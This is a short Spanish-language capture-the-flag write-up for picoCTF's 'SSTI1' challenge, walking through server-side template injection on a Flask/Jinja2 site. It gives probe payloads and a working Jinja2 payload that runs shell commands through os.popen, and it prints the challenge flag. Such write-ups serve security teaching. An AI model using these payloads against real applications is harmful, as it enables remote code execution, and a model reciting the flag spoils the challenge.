## Reto: SSTI1
### Descripción
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:63747/)!

### Solución
Server Side Template Injection

1. Ingresamos al sitio web. Notamos que utiliza plantillas porque tiene un formulario de entrada para anuncios. Como el sitio usa Python, sospechamos que el motor de las plantillas podría ser Jinja2.
2. Enviamos `{{3*3}}` para saber si la entrada es validada como código, y obtenemos `9`, lo que nos lo confirma.
3. Usamos `{{.__class__}}` y obtenemos `class 'flask.config.Config'`, lo que nos confirma que podemos acceder a atributos internos de objetos en la plantilla, o sea que la plantilla es vulnerable a SSTI.
4. Accedemos a la configuración interna de Flask con `{{Config.__class__}}` al obtener `class 'flask.config.Config'`
5. Probamos si el método `int` era accesible con `{{Config.__class__.__int__}}` y obtenemos las variables globales con `{{config.__class__.__init__.__globals__}}`. Descubrimos que `os` estaba disponible.
6. Listamos los archivos del servidor

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

output:`app.py`, `flag`, `requirements.txt`
```

7. Mostramos el contenido de flag
```flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}
```


### Notas adicionales
### Referencias

 
